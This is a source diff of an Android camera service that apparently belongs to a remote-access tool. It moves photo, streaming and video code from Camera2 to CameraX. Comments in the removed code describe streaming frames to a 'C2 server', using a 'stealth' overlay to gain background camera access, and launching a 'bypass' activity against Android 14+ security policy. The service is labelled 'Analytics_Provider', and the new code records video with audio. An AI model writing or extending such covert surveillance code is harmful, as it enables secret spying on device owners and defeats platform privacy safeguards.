-                    Log.e(TAG, "Capture error: " + error + " on camera " + cameraId);
-                    FirebaseConfig.logActivity("OPTICS_ERROR: Camera " + cameraId + " error code " + error);
-                    camera.close();
-                    cameraDevice = null;
-                    lastCaptureError = "Camera error: " + error;
-                    captureLatch.countDown();
-                }
-            }, backgroundHandler);
-
-        } catch (CameraAccessException e) {
-            lastCaptureError = "Camera access error: " + e.getMessage();
-            captureLatch.countDown();
-        } catch (SecurityException e) {
-            lastCaptureError = "Permission denied";
-            captureLatch.countDown();
+                        return Collections.emptyList();
+                    }).build();
+        } else {
+            selector = CameraSelector.DEFAULT_BACK_CAMERA;
         }
-    }
-
-    private void createPhotoCaptureSession() {
-        try {
-            List<Surface> targets = new ArrayList<>();
-            targets.add(imageReader.getSurface());
-            
-            // Add Stealth Overlay Surface if ready (required for background on many devices)
-            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
-                targets.add(surfaceView.getHolder().getSurface());
-                Log.d(TAG, "Added overlay surface to camera session");
-            }
-
-            cameraDevice.createCaptureSession(targets,
-                    new CameraCaptureSession.StateCallback() {
-                        @Override
-                        public void onConfigured(@NonNull CameraCaptureSession session) {
-                            captureSession = session;
-                            takePhoto();
-                        }
-
-                        @Override
-                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                            lastCaptureError = "Session configuration failed";
-                            captureLatch.countDown();
-                        }
-                    }, backgroundHandler);
-        } catch (CameraAccessException e) {
-            lastCaptureError = "Session error: " + e.getMessage();
-            captureLatch.countDown();
-        }
-    }
-
-    private void takePhoto() {
-        try {
-            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-            builder.addTarget(imageReader.getSurface());
-            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
-            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-
-            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
-                @Override
-                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
-                        @NonNull CaptureRequest request, @NonNull TotalCaptureResult result) {
-                    // Image available in ImageReader callback
-                }
-            }, backgroundHandler);
-        } catch (CameraAccessException e) {
-            lastCaptureError = "Capture error: " + e.getMessage();
-            captureLatch.countDown();
-        }
-    }
-
-    // ============ LIVE STREAMING ============
-
-    public void startStreaming(String cameraId, int width, int height, int quality) {
-        Log.d(TAG, "Request to start streaming: " + cameraId);
-        FirebaseConfig.logActivity("OPTICS_INIT: Starting stream from camera " + cameraId);
         
-        // [STABILITY_BYPASS] Opaque window lock for Android 14+
-        // This MUST happen before any hardware calls to satisfy security policy
-        try {
-            Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
-            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-            startActivity(bypass);
-        } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
+        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "LabRATS-Security");
+        if (!videoDir.exists()) videoDir.mkdirs();
+        File videoFile = new File(videoDir, "VID_" + System.currentTimeMillis() + ".mp4");
+        currentVideoPath = videoFile.getAbsolutePath();
 
-        if (isStreaming) {
-            stopStreaming();
-        }
-
-        currentCameraId = (cameraId != null && !cameraId.isEmpty()) ? cameraId : "0";
-        streamWidth = width > 0 ? width : 640;
-        streamHeight = Math.max(height, 480);
-        streamQuality = quality > 0 ? quality : 50;
-
-        try {
-            // [STEALTH_SURFACE_PROTOCOL]
-            // Modern Android requires an active window/surface for background camera access
-            createOverlay();
-            
-            // --- WATCHDOG_INIT ---
-            synchronized (TAG) { lastFrameReceived = System.currentTimeMillis(); }
-
-            // Critical hardware reset delay
-            if (isStreaming) {
-                stopStreaming();
-                Thread.sleep(500); 
-            }
-
-            // Allow a small window for Surface initialization
-            if (surfaceLatch != null) {
-                try { surfaceLatch.await(1000, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
-            }
-
-            startStreamingInternal();
-
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting stream", e);
-        }
-    }
-
-    private void startStreamingInternal() {
-        Log.d(TAG, "Initializing camera for internal stream: " + currentCameraId);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                Log.e(TAG, "Camera permission not granted");
-                FirebaseConfig.logActivity("OPTICS_ERROR: Camera permission missing");
-                return;
-            }
-        }
-
-        try {
-            frameQueue.clear();
-
-            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
-            Size[] sizes = characteristics.get(
-                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                    .getOutputSizes(ImageFormat.YUV_420_888);
-
-            Size size = chooseBestSize(sizes, streamWidth, streamHeight);
-            streamWidth = size.getWidth();
-            streamHeight = size.getHeight();
-
-            if (imageReader != null) {
-                imageReader.close();
-            }
-
-            // Determine rotation once for the stream session
-            final int rotation;
-            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                rotation = 270;
-            } else {
-                rotation = 90;
-            }
-
-            // [STABILITY_SYNC] High buffer count for 4K stability
-            int maxImages = (streamWidth >= 1920) ? 5 : 2;
+        new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, maxImages);
-            } catch (Exception e) {
-                Log.e(TAG, "4K Buffer failure, falling back to 1080p: " + e.getMessage());
-                streamWidth = 1920; streamHeight = 1080;
-                imageReader = ImageReader.newInstance(streamWidth, streamHeight, ImageFormat.YUV_420_888, 2);
-            }
-            imageReader.setOnImageAvailableListener(reader -> {
-                Image image = null;
-                try {
-                    if (!isStreaming || reader == null) return;
-                    image = reader.acquireLatestImage();
-                    if (image != null) {
-                        long now = System.currentTimeMillis();
-                        lastFrameTime = now;
-                        
-                        // Dynamic watchdog update
-                        synchronized (TAG) { lastFrameReceived = now; }
-
-                        // [ADAPTIVE_STREAMING]
-                        // If the queue is full, it means the network consumer (C2 server) is slow.
-                        // We immediately purge the oldest frame to maintain a real-time "Most Recent" buffer.
-                        byte[] jpegData = yuv420ToJpeg(image, streamQuality, rotation);
-                        if (jpegData != null) {
-                            if (frameQueue.size() >= 5) {
-                                frameQueue.poll(); // Drop oldest to make room for newest
+                cameraProvider.unbindAll();
+                camera = cameraProvider.bindToLifecycle(this, selector, videoCapture);
+                
+                FileOutputOptions options = new FileOutputOptions.Builder(videoFile).build();
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return;
+                
+                currentRecording = videoCapture.getOutput().prepareRecording(this, options)
+                        .withAudioEnabled()
+                        .start(ContextCompat.getMainExecutor(this), event -> {
+                            if (event instanceof VideoRecordEvent.Start) {
+                                isRecording = true;
+                                recordingStartTime = System.currentTimeMillis();
+                                FirebaseConfig.logActivity("OPTICS_VIDEO: Recording started");
+                            } else if (event instanceof VideoRecordEvent.Finalize) {
+                                isRecording = false;
+                                new Handler(Looper.getMainLooper()).post(() -> {
+                                    if (!isStreaming) {
+                                        if (cameraProvider != null) cameraProvider.unbindAll();
+                                        ensureForeground();
+                                    }
+                                });
                             }
-                            frameQueue.offer(jpegData);
-                        }
-                    }
-                } catch (IllegalStateException e) {
-                    Log.w(TAG, "ImageReader already closed, ignoring frame");
-                } catch (Exception e) {
-                    Log.e(TAG, "Error processing frame", e);
-                } finally {
-                    if (image != null) try { image.close(); } catch (Exception ignored) {}
-                }
-            }, backgroundHandler);
+                        });
+            } catch (Exception e) {
+                Log.e(TAG, "Video Init Error: " + e.getMessage());
+            }
+        });
+    }
 
-            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
-                @Override
-                public void onOpened(@NonNull CameraDevice camera) {
-                    cameraDevice = camera;
-                    createStreamingSession();
-                }
+    public void stopVideoRecording() {
+        if (currentRecording != null) {
+            currentRecording.stop();
+            currentRecording = null;
+            // State is reset in the VideoRecordEvent.Finalize listener
+        }
+    }
 
-                @Override
-                public void onDisconnected(@NonNull CameraDevice camera) {
-                    Log.w(TAG, "Camera disconnected from stream " + currentCameraId);
-                    camera.close();
-                    cameraDevice = null;
-                    isStreaming = false;
-                }
+    private byte[] yuvToNv21(ImageProxy image) {
+        int width = image.getWidth();
+        int height = image.getHeight();
+        byte[] nv21 = new byte[width * height * 3 / 2];
+        
+        ImageProxy.PlaneProxy yPlane = image.getPlanes()[0];
+        ImageProxy.PlaneProxy uPlane = image.getPlanes()[1];
+        ImageProxy.PlaneProxy vPlane = image.getPlanes()[2];
 
-                @Override
-                public void onError(@NonNull CameraDevice camera, int error) {
-                    Log.e(TAG, "Camera device error: " + error + " on camera " + currentCameraId);
-                    FirebaseConfig.logActivity("OPTICS_ERROR: Stream camera " + currentCameraId + " error " + error);
-                    camera.close();
-                    cameraDevice = null;
-                    isStreaming = false;
-                }
-            }, backgroundHandler);
+        ByteBuffer yBuffer = yPlane.getBuffer();
+        ByteBuffer uBuffer = uPlane.getBuffer();
+        ByteBuffer vBuffer = vPlane.getBuffer();
 
+        int yRowStride = yPlane.getRowStride();
+        int uRowStride = uPlane.getRowStride();
+        int uvPixelStride = uPlane.getPixelStride();
+
+        // Copy Y plane
+        int pos = 0;
+        for (int row = 0; row < height; row++) {
+            yBuffer.position(row * yRowStride);
+            yBuffer.get(nv21, pos, width);
+            pos += width;
+        }
+
+        // Copy UV plane (interleaved)
+        for (int row = 0; row < height / 2; row++) {
+            for (int col = 0; col < width / 2; col++) {
+                int uvOffset = row * uRowStride + col * uvPixelStride;
+                if (uvOffset < vBuffer.capacity() && uvOffset < uBuffer.capacity()) {
+                    nv21[pos++] = vBuffer.get(uvOffset);
+                    nv21[pos++] = uBuffer.get(uvOffset);
+                }
+            }
+        }
+        return nv21;
+    }
+
+    private byte[] yuv420ToJpeg(ImageProxy image, int quality) {
+        try {
+            byte[] nv21 = yuvToNv21(image);
+            YuvImage yuvImage = new YuvImage(nv21, android.graphics.ImageFormat.NV21, image.getWidth(), image.getHeight(), null);
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            yuvImage.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), quality, out);
+            byte[] imageBytes = out.toByteArray();
+
+            // Handle rotation
+            if (image.getImageInfo().getRotationDegrees() != 0) {
+                Bitmap bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
+                if (bitmap != null) {
+                    Matrix matrix = new Matrix();
+                    matrix.postRotate(image.getImageInfo().getRotationDegrees());
+                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
+                    ByteArrayOutputStream rotateOut = new ByteArrayOutputStream();
+                    rotated.compress(Bitmap.CompressFormat.JPEG, quality, rotateOut);
+                    imageBytes = rotateOut.toByteArray();
+                    bitmap.recycle();
+                    rotated.recycle();
+                }
+            }
+            return imageBytes;
         } catch (Exception e) {
-            Log.e(TAG, "Error starting stream", e);
-            FirebaseConfig.logActivity("OPTICS_ERROR: Fatal stream init error: " + e.getMessage());
-            isStreaming = false;
-        }
-    }
-
-    private void createStreamingSession() {
-        if (cameraDevice == null || imageReader == null) {
-            Log.e(TAG, "cameraDevice or imageReader is null, cannot create session");
-            isStreaming = false;
-            return;
-        }
-        try {
-            List<Surface> targets = new ArrayList<>();
-            targets.add(imageReader.getSurface());
-            
-            // Add Stealth Overlay Surface if ready (required for background on many devices)
-            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface() != null) {
-                targets.add(surfaceView.getHolder().getSurface());
-                Log.d(TAG, "Added overlay surface to camera session");
-            }
-
-            cameraDevice.createCaptureSession(targets,
-                    new CameraCaptureSession.StateCallback() {
-                        @Override
-                        public void onConfigured(@NonNull CameraCaptureSession session) {
-                            captureSession = session;
-                            startPreview();
-                        }
-
-                        @Override
-                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                            Log.e(TAG, "Streaming session configuration failed");
-                            isStreaming = false;
-                        }
-                    }, backgroundHandler);
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Error creating streaming session", e);
-            isStreaming = false;
-        }
-    }
-
-    private void startPreview() {
-        if (cameraDevice == null) {
-            Log.e(TAG, "cameraDevice is null, cannot start preview");
-            isStreaming = false;
-            return;
-        }
-
-        // --- ANDROID 14+ FGS UPGRADE ---
-        // We must update the foreground service with CAMERA type right before using it
-        ensureForeground();
-
-        try {
-            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-            builder.addTarget(imageReader.getSurface());
-            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
-            
-            if (nightModeEnabled) {
-                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF);
-                builder.set(CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
-                builder.set(CaptureRequest.SENSOR_SENSITIVITY, 1600); // High ISO
-            } else {
-                builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-            }
-
-            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
-            isStreaming = true;
-            Log.d(TAG, "Streaming started");
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Error starting preview", e);
-            isStreaming = false;
+            return null;
         }
     }
 
     public void stopStreaming() {
         isStreaming = false;
-        closeCamera();
-        removeOverlay(); // Clean up overlay to fully release resources
         frameQueue.clear();
-        Log.d(TAG, "Streaming stopped and overlay removed");
-    }
-
-    public void setFlashMode(boolean on) {
-        if (cameraDevice == null || captureSession == null) return;
-        backgroundHandler.post(() -> {
+        new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                CaptureRequest.Builder builder;
-                if (isRecording && recorderSurface != null) {
-                    builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
-                    builder.addTarget(recorderSurface);
-                } else if (isStreaming && imageReader != null) {
-                    builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-                    builder.addTarget(imageReader.getSurface());
-                } else {
-                    return;
+                if (cameraProvider != null) {
+                    cameraProvider.unbindAll();
                 }
-                builder.set(CaptureRequest.FLASH_MODE, on ? CaptureRequest.FLASH_MODE_TORCH : CaptureRequest.FLASH_MODE_OFF);
-                captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
-            } catch (Exception e) {
-                Log.e(TAG, "Flash Error: " + e.getMessage());
-            }
+            } catch (Exception ignored) {}
+            removeOverlay();
+            ensureForeground(); // Force indicator reset
         });
     }
 
-
-    private byte[] yuv420ToJpeg(Image image, int quality, int rotation) {
-        try {
-            int width = image.getWidth();
-            int height = image.getHeight();
-            
-            // [QUALITY_BOOST] Ensure high fidelity for Ultra High modes
-            int finalQuality = quality;
-            if (width >= 1920) finalQuality = Math.max(quality, 95);
-
-            Image.Plane[] planes = image.getPlanes();
-            ByteBuffer yBuffer = planes[0].getBuffer();
-            ByteBuffer uBuffer = planes[1].getBuffer();
-            ByteBuffer vBuffer = planes[2].getBuffer();
-
-            int yStride = planes[0].getRowStride();
-            int uvStride = planes[1].getRowStride();
-            int uvPixelStride = planes[1].getPixelStride();
-
-            byte[] nv21 = new byte[width * height * 3 / 2];
-            int pos = 0;
-
-            // Copy Y plane row by row to handle stride
-            for (int row = 0; row < height; row++) {
-                yBuffer.position(row * yStride);
-                int count = Math.min(width, yBuffer.remaining());
-                yBuffer.get(nv21, pos, count);
-                pos += width;
-            }
-
-            // Copy UV planes with correct pixel stride handling
-            for (int row = 0; row < height / 2; row++) {
-                int rowStart = row * uvStride;
-                for (int col = 0; col < width / 2; col++) {
-                    int offset = rowStart + col * uvPixelStride;
-                    if (offset < vBuffer.limit() && offset < uBuffer.remaining() + uBuffer.position()) {
-                        nv21[pos++] = vBuffer.get(offset);
-                        nv21[pos++] = uBuffer.get(offset);
-                    }
-                }
-            }
-
-            YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, width, height, null);
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            yuvImage.compressToJpeg(new Rect(0, 0, width, height), finalQuality, out);
-
-            if (rotation == 0) {
-                return out.toByteArray();
-            } else {
-                return rotateJpeg(out.toByteArray(), rotation);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error converting YUV to JPEG", e);
-            return null;
-        }
-    }
-
-    // ============ UTILITY METHODS ============
-
-    private Size chooseBestSize(Size[] sizes, int targetWidth, int targetHeight) {
-        if (sizes == null || sizes.length == 0) return new Size(640, 480);
-
-        List<Size> sizeList = new ArrayList<>(Arrays.asList(sizes));
-        // Sort descending by area to determine the native aspect ratio from the largest sensor output
-        Collections.sort(sizeList, (a, b) -> Integer.compare(b.getWidth() * b.getHeight(), a.getWidth() * a.getHeight()));
-
-        Size largest = sizeList.get(0);
-        float targetAspect = (float) largest.getWidth() / largest.getHeight();
-
-        // [STABILITY_SYNC] Only pick sizes with matching aspect ratios to prevent FOV shift (zoom effect)
-        List<Size> consistentAspectList = new ArrayList<>();
-        for (Size s : sizes) {
-            float aspect = (float) s.getWidth() / s.getHeight();
-            if (Math.abs(aspect - targetAspect) < 0.05) { // 5% tolerance
-                consistentAspectList.add(s);
-            }
-        }
-
-        // If no sizes match aspect ratio (rare), fallback to full safe list
-        List<Size> sourceList = consistentAspectList.isEmpty() ? sizeList : consistentAspectList;
-
-        // [ULTRA_HIGH_FORCE]
-        long targetArea = (long) targetWidth * targetHeight;
-        Size best = sourceList.get(sourceList.size() - 1); // Default to smallest
-        long minDiff = Long.MAX_VALUE;
-
-        for (Size s : sourceList) {
-            long area = (long) s.getWidth() * s.getHeight();
-            long diff = Math.abs(area - targetArea);
-            if (area >= targetArea && diff < minDiff) {
-                minDiff = diff;
-                best = s;
-            }
-        }
-        return best;
-    }
-
-    private synchronized void closeCamera() {
-        Log.d(TAG, "Closing camera resources");
-        try {
-            if (captureSession != null) {
-                try {
-                    captureSession.stopRepeating();
-                    captureSession.abortCaptures();
-                } catch (Exception ignored) {}
-                captureSession.close();
-                captureSession = null;
-            }
-            if (cameraDevice != null) {
-                cameraDevice.close();
-                cameraDevice = null;
-            }
-            if (imageReader != null) {
-                imageReader.close();
-                imageReader = null;
-            }
-            // Add a small breather for the HAL
-            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-        } catch (Exception e) {
-            Log.e(TAG, "Error while closing camera", e);
-        }
-    }
-
-    public List<CameraInfo> getAvailableCameras() {
-        List<CameraInfo> cameras = new ArrayList<>();
-        try {
-            String[] cameraIds = cameraManager.getCameraIdList();
-            for (String cameraId : cameraIds) {
-                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
-                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-
-                String facingStr = "Unknown";
-                if (facing != null) {
-                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                        facingStr = "Front";
-                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
-                        facingStr = "Back";
-                    }
-                }
-
-                Size[] sizes = characteristics.get(
-                        CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                        .getOutputSizes(ImageFormat.JPEG);
-
-                int width = 640, height = 480;
-                if (sizes != null && sizes.length > 0) {
-                    Size size = chooseBestSize(sizes, 1280, 720);
-                    width = size.getWidth();
-                    height = size.getHeight();
-                }
-
-                cameras.add(new CameraInfo(cameraId, facingStr, width, height));
-            }
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Error getting camera list", e);
-        }
-        return cameras;
-    }
-
-    // ============ STATIC ACCESSORS ============
-
-    public static boolean isCurrentlyStreaming() {
-        return isStreaming;
-    }
-
-    public static byte[] getNextFrame() {
-        return frameQueue.poll();
-    }
-
-    public static byte[] getNextFrame(long timeoutMs) {
-        try {
-            return frameQueue.poll(timeoutMs, TimeUnit.MILLISECONDS);
-        } catch (InterruptedException e) {
-            return null;
-        }
-    }
-
-    public static byte[] waitForPhoto(long timeoutMs) {
-        if (captureLatch != null) {
-            try {
-                captureLatch.await(timeoutMs, TimeUnit.MILLISECONDS);
-            } catch (InterruptedException e) {
-            }
-        }
-        return lastCapturedPhoto;
-    }
-
-    public static String getLastCaptureError() {
-        return lastCaptureError;
-    }
-
-    public static boolean isCaptureInProgress() {
-        return captureInProgress;
-    }
-
-    public static String getCurrentCameraId() {
-        return currentCameraId;
-    }
-
-    public static int getStreamWidth() {
-        return streamWidth;
-    }
-
-    public static int getStreamHeight() {
-        return streamHeight;
-    }
-
-    public void setNightMode(boolean enabled) {
-        nightModeEnabled = enabled;
-        getSharedPreferences("StabilityConfig", MODE_PRIVATE)
-                .edit().putBoolean("night_mode", enabled).commit();
-        if (isStreaming && captureSession != null && cameraDevice != null) {
-            startPreview(); // Restart preview to apply changes
-        }
-    }
-
-    public static boolean isNightModeEnabled(Context context) {
-        if (instance != null) return nightModeEnabled;
-        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getBoolean("night_mode", false);
-    }
-
-    public static boolean isNightModeEnabled() {
-        return nightModeEnabled;
-    }
-
-    // ============ CAMERA INFO CLASS ============
-
-    public static class CameraInfo {
-        public String id;
-        public String facing;
-        public int width;
-        public int height;
-
-        public CameraInfo(String id, String facing, int width, int height) {
-            this.id = id;
-            this.facing = facing;
-            this.width = width;
-            this.height = height;
-        }
-    }
-
-    @Nullable
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        Log.d(TAG, "Analytics_Provider onDestroy");
+    private void shutdown() {
         isStreaming = false;
-        stopVideoRecording();
-        closeCamera();
-        removeOverlay();
-        stopBackgroundThread();
-        releaseWakeLock();
-        instance = null;
-    }
-
-    // ============ WAKELOCK MANAGEMENT ============
-
-    private void acquireWakeLock() {
-        if (wakeLock != null && !wakeLock.isHeld()) {
-            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
-            Log.d(TAG, "WakeLock acquired");
-        }
-    }
-
-    private void releaseWakeLock() {
-        if (wakeLock != null && wakeLock.isHeld()) {
-            wakeLock.release();
-            Log.d(TAG, "WakeLock released");
-        }
-    }
-
-    // ============ VIDEO RECORDING ============
-
-    public void startVideoRecording(String cameraId, int width, int height) {
-        if (isRecording) {
-            Log.w(TAG, "Already recording, stop first");
-            return;
-        }
-
-        if (cameraId == null)
-            cameraId = "0";
-        currentCameraId = cameraId;
-
-        final String finalCameraId = cameraId;
-        final int finalWidth = width;
-        final int finalHeight = height;
-
-        backgroundHandler.post(() -> {
+        isRecording = false;
+        captureInProgress = false;
+        
+        new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                createOverlay();
-
-                // Wait for surface
-                if (surfaceLatch != null) {
-                    surfaceLatch.await(5, TimeUnit.SECONDS);
+                if (cameraProvider != null) {
+                    cameraProvider.unbindAll();
                 }
-
-                if (!surfaceReady) {
-                    Log.e(TAG, "Surface not ready for video recording");
-                    return;
-                }
-
-                startVideoRecordingInternal(finalCameraId, finalWidth, finalHeight);
-
-            } catch (Exception e) {
-                Log.e(TAG, "Error starting video recording", e);
+            } catch (Exception ignored) {}
+            
+            if (currentRecording != null) {
+                currentRecording.stop();
+                currentRecording = null;
             }
+            
+            removeOverlay();
+            lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
+            stopForeground(true);
+            stopSelf();
         });
     }
 
-    private void startVideoRecordingInternal(String cameraId, int width, int height) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                Log.e(TAG, "Camera permission not granted");
-                return;
-            }
-        }
-
-        try {
-            // Close any existing camera
-            closeCamera();
-
-            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
-            Size[] sizes = characteristics.get(
-                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-                    .getOutputSizes(MediaRecorder.class);
-
-            Size size = chooseBestSize(sizes, width, height);
-            int recWidth = size.getWidth();
-            int recHeight = size.getHeight();
-
-            // Create video file
-            File videoDir = new File(Environment.getExternalStoragePublicDirectory(
-                    Environment.DIRECTORY_MOVIES), "LabRATS-Security");
-            if (!videoDir.exists()) {
-                videoDir.mkdirs();
-            }
-
-            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
-                    .format(new Date());
-            File videoFile = new File(videoDir, "VID_" + timestamp + ".mp4");
-            currentVideoPath = videoFile.getAbsolutePath();
-
-            // Setup MediaRecorder
-            setupMediaRecorder(recWidth, recHeight);
-
-            // Open camera
-            if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
-                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                    @Override
-                    public void onOpened(@NonNull CameraDevice camera) {
-                        cameraDevice = camera;
-                        createVideoRecordingSession(recWidth, recHeight);
-                    }
-
-                    @Override
-                    public void onDisconnected(@NonNull CameraDevice camera) {
-                        camera.close();
-                        cameraDevice = null;
-                        isRecording = false;
-                    }
-
-                @Override
-                public void onError(@NonNull CameraDevice camera, int error) {
-                    Log.e(TAG, "Video recording camera error: " + error);
-                    camera.close();
-                    cameraDevice = null;
-                    isRecording = false;
-                }
-                }, backgroundHandler);
-            }
-
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting video recording", e);
-            isRecording = false;
-        }
-    }
-
-    private void setupMediaRecorder(int width, int height) throws IOException {
-        mediaRecorder = new MediaRecorder();
-        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
-        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        mediaRecorder.setOutputFile(currentVideoPath);
-        mediaRecorder.setVideoEncodingBitRate(4000000); // 4 Mbps
-        mediaRecorder.setVideoFrameRate(30);
-        mediaRecorder.setVideoSize(width, height);
-            // Set orientation hint: 90 for back, 270 for front
-            int rotation = 90;
-            try {
-                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
-                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                    rotation = 270;
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting orientation for video", e);
-                rotation = 270;
-            }
-            mediaRecorder.setOrientationHint(rotation);
-        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-        mediaRecorder.setAudioEncodingBitRate(128000);
-        mediaRecorder.setAudioSamplingRate(44100);
-        mediaRecorder.prepare();
-
-        recorderSurface = mediaRecorder.getSurface();
-        Log.d(TAG, "MediaRecorder prepared: " + width + "x" + height + " -> " + currentVideoPath);
-    }
-
-    private void createVideoRecordingSession(int width, int height) {
-        try {
-            List<Surface> surfaces = new ArrayList<>();
-            surfaces.add(recorderSurface);
-
-            cameraDevice.createCaptureSession(surfaces,
-                    new CameraCaptureSession.StateCallback() {
-                        @Override
-                        public void onConfigured(@NonNull CameraCaptureSession session) {
-                            captureSession = session;
-                            startRecordingCapture();
-                        }
-
-                        @Override
-                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                            Log.e(TAG, "Video recording session configuration failed");
-                            isRecording = false;
-                        }
-                    }, backgroundHandler);
-        } catch (CameraAccessException e) {
-            Log.e(TAG, "Error creating video recording session", e);
-            isRecording = false;
-        }
-    }
-
-    private void startRecordingCapture() {
-        try {
-            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
-            builder.addTarget(recorderSurface);
-            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
-            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-
-            captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
-
-            mediaRecorder.start();
-            isRecording = true;
-            recordingStartTime = System.currentTimeMillis();
-            Log.d(TAG, "Video recording started: " + currentVideoPath);
-
-            // Update notification
-            updateNotification("Recording video...");
-
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting recording capture", e);
-            isRecording = false;
-        }
-    }
-
-    public void stopVideoRecording() {
-        if (!isRecording) {
-            return;
-        }
-
-        isRecording = false;
-        Log.d(TAG, "Stopping video recording");
-
-        try {
-            if (captureSession != null) {
-                captureSession.stopRepeating();
-                captureSession.close();
-                captureSession = null;
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error stopping capture session", e);
-        }
-
-        try {
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.reset();
-                mediaRecorder.release();
-                mediaRecorder = null;
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error stopping MediaRecorder", e);
-        }
-
-        if (recorderSurface != null) {
-            recorderSurface.release();
-            recorderSurface = null;
-        }
-
-        closeCamera();
-
-        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
-        Log.d(TAG, "Video recording stopped. Duration: " + duration + "s, Path: " + currentVideoPath);
-
-        // Update notification
-        updateNotification("Camera service is running");
-    }
-
-    private void updateNotification(String text) {
